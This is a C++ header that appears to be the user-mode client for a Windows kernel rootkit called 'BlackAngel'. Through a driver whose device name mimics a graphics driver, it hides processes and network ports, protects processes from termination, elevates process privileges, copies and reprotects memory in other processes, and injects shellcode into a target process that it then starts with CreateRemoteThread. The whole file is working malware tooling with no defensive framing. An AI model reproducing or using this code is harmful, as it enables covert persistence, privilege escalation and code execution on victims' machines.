#pragma once
#include <iostream>
#include <Windows.h>

#define IOCTL_HIDEPROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666a, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_HIDEPORT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666b, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_PROTPROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666c, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_ELEVPROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666d, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_SHELL    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666e, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_GETBUFF  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666f, METHOD_NEITHER, FILE_SPECIAL_ACCESS)

#define IOCTL_ZWPVM    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x786166665a, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_MCVM     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x786166665b, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_ZQIP     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x786166665c, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_ZUVOS    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x786166665d, METHOD_NEITHER, FILE_SPECIAL_ACCESS)

// Set to FALSE to disable console output
#define OUTPUT TRUE


namespace BlackAngel
{
	static HANDLE DriverHandle = nullptr;

	BOOL Connect()
	{
		DriverHandle = CreateFile(L"\\\\.\\DxgDrv", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

		if (DriverHandle == INVALID_HANDLE_VALUE)
		{
#if OUTPUT
			std::cout << "[-] Couldn't open handle to the driver. Error : " << GetLastError() << std::endl;
#endif
			return FALSE;
		}

		return TRUE;
	}

	struct PidData {
		UINT32 Pid;
	};

	struct PortData {
		USHORT Port;
	};

	struct HideProtocol {
		USHORT LTCP;
		USHORT RTCP;
		USHORT UDP;
	};

	struct Shell {
		UINT32 pid;
		unsigned char* shellcode;
		UINT32 size;
	};

	typedef enum _PROCESSINFOCLASS
	{
		ProcessBasicInformation, // 0, q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
		ProcessQuotaLimits, // qs: QUOTA_LIMITS, QUOTA_LIMITS_EX
		ProcessIoCounters, // q: IO_COUNTERS
		ProcessVmCounters, // q: VM_COUNTERS, VM_COUNTERS_EX, VM_COUNTERS_EX2
		ProcessTimes, // q: KERNEL_USER_TIMES
		ProcessBasePriority, // s: KPRIORITY
		ProcessRaisePriority, // s: ULONG
		ProcessDebugPort, // q: HANDLE
		ProcessExceptionPort, // s: HANDLE
		ProcessAccessToken, // s: PROCESS_ACCESS_TOKEN
		ProcessLdtInformation, // 10, qs: PROCESS_LDT_INFORMATION
		ProcessLdtSize, // s: PROCESS_LDT_SIZE
		ProcessDefaultHardErrorMode, // qs: ULONG
		ProcessIoPortHandlers, // (kernel-mode only)
		ProcessPooledUsageAndLimits, // q: POOLED_USAGE_AND_LIMITS
		ProcessWorkingSetWatch, // q: PROCESS_WS_WATCH_INFORMATION[]; s: void
		ProcessUserModeIOPL,
		ProcessEnableAlignmentFaultFixup, // s: BOOLEAN
		ProcessPriorityClass, // qs: PROCESS_PRIORITY_CLASS
		ProcessWx86Information,
		ProcessHandleCount, // 20, q: ULONG, PROCESS_HANDLE_INFORMATION
		ProcessAffinityMask, // s: KAFFINITY
		ProcessPriorityBoost, // qs: ULONG
		ProcessDeviceMap, // qs: PROCESS_DEVICEMAP_INFORMATION, PROCESS_DEVICEMAP_INFORMATION_EX
		ProcessSessionInformation, // q: PROCESS_SESSION_INFORMATION
		ProcessForegroundInformation, // s: PROCESS_FOREGROUND_BACKGROUND
		ProcessWow64Information, // q: ULONG_PTR
		ProcessImageFileName, // q: UNICODE_STRING
		ProcessLUIDDeviceMapsEnabled, // q: ULONG
		ProcessBreakOnTermination, // qs: ULONG
		ProcessDebugObjectHandle, // 30, q: HANDLE
		ProcessDebugFlags, // qs: ULONG
		ProcessHandleTracing, // q: PROCESS_HANDLE_TRACING_QUERY; s: size 0 disables, otherwise enables
		ProcessIoPriority, // qs: ULONG
		ProcessExecuteFlags, // qs: ULONG
		ProcessResourceManagement,
		ProcessCookie, // q: ULONG
		ProcessImageInformation, // q: SECTION_IMAGE_INFORMATION
		ProcessCycleTime, // q: PROCESS_CYCLE_TIME_INFORMATION // since VISTA
		ProcessPagePriority, // q: ULONG
		ProcessInstrumentationCallback, // 40
		ProcessThreadStackAllocation, // s: PROCESS_STACK_ALLOCATION_INFORMATION, PROCESS_STACK_ALLOCATION_INFORMATION_EX
		ProcessWorkingSetWatchEx, // q: PROCESS_WS_WATCH_INFORMATION_EX[]
		ProcessImageFileNameWin32, // q: UNICODE_STRING
		ProcessImageFileMapping, // q: HANDLE (input)
		ProcessAffinityUpdateMode, // qs: PROCESS_AFFINITY_UPDATE_MODE
		ProcessMemoryAllocationMode, // qs: PROCESS_MEMORY_ALLOCATION_MODE
		ProcessGroupInformation, // q: USHORT[]
		ProcessTokenVirtualizationEnabled, // s: ULONG
		ProcessConsoleHostProcess, // q: ULONG_PTR
		ProcessWindowInformation, // 50, q: PROCESS_WINDOW_INFORMATION
		ProcessHandleInformation, // q: PROCESS_HANDLE_SNAPSHOT_INFORMATION // since WIN8
		ProcessMitigationPolicy, // s: PROCESS_MITIGATION_POLICY_INFORMATION
		ProcessDynamicFunctionTableInformation,
		ProcessHandleCheckingMode,
		ProcessKeepAliveCount, // q: PROCESS_KEEPALIVE_COUNT_INFORMATION
		ProcessRevokeFileHandles, // s: PROCESS_REVOKE_FILE_HANDLES_INFORMATION
		ProcessWorkingSetControl, // s: PROCESS_WORKING_SET_CONTROL
		ProcessHandleTable, // since WINBLUE
		ProcessCheckStackExtentsMode,
		ProcessCommandLineInformation, // 60, q: UNICODE_STRING
		ProcessProtectionInformation, // q: PS_PROTECTION
		ProcessMemoryExhaustion, // PROCESS_MEMORY_EXHAUSTION_INFO // since THRESHOLD
		ProcessFaultInformation, // PROCESS_FAULT_INFORMATION
		ProcessTelemetryIdInformation, // PROCESS_TELEMETRY_ID_INFORMATION
		ProcessCommitReleaseInformation, // PROCESS_COMMIT_RELEASE_INFORMATION
		ProcessDefaultCpuSetsInformation,
		ProcessAllowedCpuSetsInformation,
		ProcessReserved1Information,
		ProcessReserved2Information,
		ProcessSubsystemProcess, // 70
		ProcessJobMemoryInformation, // PROCESS_JOB_MEMORY_INFO
		MaxProcessInfoClass
	} PROCESSINFOCLASS;

	typedef struct ZwProtectVirtualMemoryStruct
	{
		HANDLE ProcessHandle;
		PVOID* BaseAddress;
		SIZE_T* NumberOfBytesToProtect;
		ULONG NewAccessProtection;
		PULONG OldAccessProtection;
	} zwpvm_t;

	typedef struct MmCopyVirtualMemoryStruct
	{
		ULONG SourceProcessPid;
		PVOID SourceAddress;
		ULONG TargetProcessPid;
		PVOID TargetAddress;
		SIZE_T BufferSize;
	} mcvm_t;

	typedef struct ZwQueryInformationProcessStruct
	{
		HANDLE           ProcessHandle;
		PROCESSINFOCLASS  ProcessInformationClass;
		PVOID            ProcessInformation;
		ULONG            ProcessInformationLength;
		PULONG           ReturnLength;
	} zqip_t;

	typedef struct ZwUnmapViewOfSectionStruct
	{
		HANDLE ProcessHandle;
		PVOID  BaseAddress;
	} zuvos_t;

	BOOL HideProcess(UINT32 PID)
	{
		PidData data;
		data.Pid = PID;

		DWORD returned;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_HIDEPROC, &data, sizeof(data), nullptr, 0, &returned, nullptr);

		if (!success)
		{
#if OUTPUT
			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
#endif
			return success;
		}

#if OUTPUT
		std::cout << "[!] Message sent to the driver" << std::endl;
#endif
		return success;
	}

	BOOL ElevateProcess(UINT32 PID)
	{
		PidData data;
		data.Pid = PID;

		DWORD returned;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_ELEVPROC, &data, sizeof(data), nullptr, 0, &returned, nullptr);

		if (!success)
		{
#if OUTPUT
			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
#endif
			return success;
		}

#if OUTPUT
		std::cout << "[!] Message sent to driver" << std::endl;
#endif
		return success;
	}

	BOOL ProtectProcess(UINT32 PID)
	{
		PidData data;
		data.Pid = PID;

		DWORD returned;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_PROTPROC, &data, sizeof(data), nullptr, 0, &returned, nullptr);
		if (!success)
		{
#if OUTPUT
			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
#endif
			return success;
		}

#if OUTPUT
		std::cout << "[!] Message sent to the driver" << std::endl;
#endif
		return success;
	}

	BOOL HidePort(HideProtocol hp)
	{
		DWORD returned;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_HIDEPORT, &hp, sizeof(hp), nullptr, 0, &returned, nullptr);
		if (!success)
		{
#if OUTPUT
			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
#endif
			return success;
		}

#if OUTPUT
		std::cout << "[!] Message sent to the driver" << std::endl;
#endif
		return success;
	}

	BOOL InjectShellcode(unsigned char* shellcode, UINT32 shellcodeSize, UINT32 PID)
	{
		Shell shell;
		shell.shellcode = shellcode;
		shell.size = shellcodeSize;
		shell.pid = PID;

		ULONG retn;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_SHELL, &shell, sizeof(shell), NULL, 0, &retn, NULL);
		if (!success)
		{
#if OUTPUT
			printf("[-] Could not open device control | Error : %d\n", GetLastError());
#endif
			return success;
		}

		PVOID buffer = { 0 };
		success = DeviceIoControl(DriverHandle, IOCTL_GETBUFF, &buffer, sizeof(buffer), &buffer, sizeof(buffer), &retn, NULL);
		if (!success)
		{
#if OUTPUT
			printf("[-] Could not open device control | Error : %d\n", GetLastError());
#endif
			return success;
		}

#if OUTPUT
		printf("Buffer : 0x%x", buffer);
#endif

		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
		CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);

		return success;
	}

	BOOL ZwProtectVirtualMemory(HANDLE processHandle, PVOID* baseAddress, SIZE_T* numberOfBytesToProtect, ULONG newAccessProtection, PULONG oldAccessProtection)
	{
		zwpvm_t zwpvm;
		zwpvm.ProcessHandle = processHandle;
		zwpvm.BaseAddress = baseAddress;
		zwpvm.NumberOfBytesToProtect = numberOfBytesToProtect;
		zwpvm.NewAccessProtection = newAccessProtection;
		zwpvm.OldAccessProtection = oldAccessProtection;

		DWORD returned;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_ZWPVM, &zwpvm, sizeof(zwpvm), nullptr, 0, &returned, nullptr);
		if (!success)
		{
#if OUTPUT
			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
#endif
			return success;
		}

#if OUTPUT
		std::cout << "[!] Message sent to the driver" << std::endl;
#endif
		return success;
	}

	BOOL ZwProtectVirtualMemory(zwpvm_t zwpvm)
	{
		DWORD returned;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_ZWPVM, &zwpvm, sizeof(zwpvm), nullptr, 0, &returned, nullptr);
		if (!success)
		{
#if OUTPUT
			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
#endif
			return success;
		}

#if OUTPUT
		std::cout << "[!] Message sent to the driver" << std::endl;
#endif
		return success;
	}

	BOOL MmCopyVirtualMemory(ULONG sourceProcessPid, PVOID sourceAddress, ULONG targetProcessPid, PVOID targetAddress, SIZE_T bufferSize)
	{
		mcvm_t mcvm;
		mcvm.SourceProcessPid = sourceProcessPid;
		mcvm.SourceAddress = sourceAddress;
		mcvm.TargetProcessPid = targetProcessPid;
		mcvm.TargetAddress = targetAddress;
		mcvm.BufferSize = bufferSize;

		DWORD returned;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_MCVM, &mcvm, sizeof(mcvm), nullptr, 0, &returned, nullptr);
		if (!success)
		{
#if OUTPUT
			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
#endif
			return success;
		}

#if OUTPUT
		std::cout << "[!] Message sent to the driver" << std::endl;
#endif
		return success;
	}

	BOOL MmCopyVirtualMemory(mcvm_t mcvm)
	{
		DWORD returned;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_MCVM, &mcvm, sizeof(mcvm), nullptr, 0, &returned, nullptr);
		if (!success)
		{
#if OUTPUT
			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
#endif
			return success;
		}

#if OUTPUT
		std::cout << "[!] Message sent to the driver" << std::endl;
#endif
		return success;
	}
	
}